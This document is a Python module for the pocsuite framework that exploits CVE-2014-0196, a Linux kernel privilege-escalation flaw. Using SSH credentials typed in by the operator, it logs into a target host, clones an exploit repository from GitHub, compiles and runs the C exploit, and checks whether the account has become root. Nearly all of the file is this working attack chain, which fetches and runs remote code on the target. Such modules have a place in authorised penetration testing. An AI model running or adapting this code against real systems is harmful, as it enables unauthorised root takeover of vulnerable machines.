#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from pocsuite.api.request import req  # 用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import paramiko
import time
poc_code = """
git clone https://github.com/WeiiHong/test1
"""

class TestPOC(POCBase):
    name = 'liunx_cve-2014-0196'
    vulID = 'CVE-2014-0196'
    author = ['weihong']
    vulType = ''
    version = '1.0'  # default version: 1.0
    references = ['']
    desc = '''
		   从Linux 2.6.31-rc3起便存在的本地代码执行漏洞，导致问题，攻击者会获取 root shell 
		   '''
    vulDate = '2014-05-20'
    createDate = '2020-03-13'
    updateDate = '2020-03-13'
    appName = 'Liunx'
    appVersion = 'Linux kernel <= v3.15-rc4'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()
    def _verify(self):
        '''verify mode'''
        result = {}
        result1 = poc(self.url)
        if result1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' CVE-2014-0196' + ' is exist!'
        return self.parse_output(result)
        #result = {}
        #result = poc()
        #print(result,self.parse_output(result))
        #return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output




def poc(url):
    #host_ip=raw_input("ip=")
    user_name=raw_input("uname=")
    password=raw_input("pwd=")
    ip=str(url)[7:]
    ls_command = "pwd"
    command = ls_command
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip,username=user_name,password=password)
    #ssh.connect('192.0.0.1',username='admin',password=password)


    stdin, stdout, stderr = ssh.exec_command(command)
    out = stdout.readlines()
    err = stderr.readlines()
    #print out,err

    stdin, stdout, stderr = ssh.exec_command("whoami")
    out1 = stdout.readlines()
    err = stderr.readlines()

    stdin, stdout, stderr = ssh.exec_command("git clone https://github.com/WeiiHong/test1")
    out = stdout.readlines()
    err = stderr.readlines()

    stdin, stdout, stderr = ssh.exec_command("cd test1 && ls && gcc cve-2014-0196-md.c -lutil -lpthread")
    out = stdout.readlines()
    err = stderr.readlines()
    stdin, stdout, stderr = ssh.exec_command("./test1/a.out")
    stdin, stdout, stderr = ssh.exec_command("whoami")
    out2 = stdout.readlines()
    err = stderr.readlines()

    ssh.close()

    if out1!=out2 and str(out2)[3:7]=='root':
        #print "no"
        return True
    else:
        #print "yes"
        return False

register(TestPOC)